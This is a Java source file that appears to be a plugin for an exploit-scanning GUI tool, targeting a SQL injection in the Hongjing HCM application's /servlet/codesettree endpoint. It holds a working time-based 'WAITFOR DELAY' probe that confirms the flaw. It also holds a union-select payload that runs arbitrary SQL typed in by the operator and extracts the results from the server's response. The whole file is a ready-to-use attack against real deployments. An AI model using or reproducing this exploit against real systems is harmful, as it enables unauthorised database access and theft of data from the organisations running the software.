package exp.oa.hongjingoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;
import decrypt.code.getAllEncode;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class hongjing_hcm_codesettree_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data = "1';WAITFOR DELAY '0:0:3' --";
            String fullSql = getAllEncode.getAllUrlEncode(data,"all").replace("%","~");
            long var = HttpTools_getTime.get(url + "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories="+fullSql, head, "utf-8");
            if (var>3000 && var < 4000) {
                String target_req = url + "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories="+fullSql;
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_codesettree_sqli ]");
                    textArea.appendText("\n (1) 延时注入,sql: sqlserver");
                    textArea.appendText("\n (2) 联合查询注入, CMD输入sql语句, eg: user_name()");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +"\n"+data+
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data = "1' union all select '1',"+sql+" --";
            String fullSql = getAllEncode.getAllUrlEncode(data,"all").replace("%","~");
            Response get = HttpTools.get(url + "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories="+fullSql, head, "utf-8");
            if (get.getText()!="" && get.getCode() == 200) {
                String var = get.getText();
                String pattern = "text=\"(.*?)\"";

                Pattern regex = Pattern.compile(pattern);
                Matcher matcher = regex.matcher(var);
                String text = "";
                while (matcher.find()) {
                    text =text + matcher.group(1).replace("1 ","")+"\n";

                }
                String finalText = text.replace("root","");
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + finalText);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
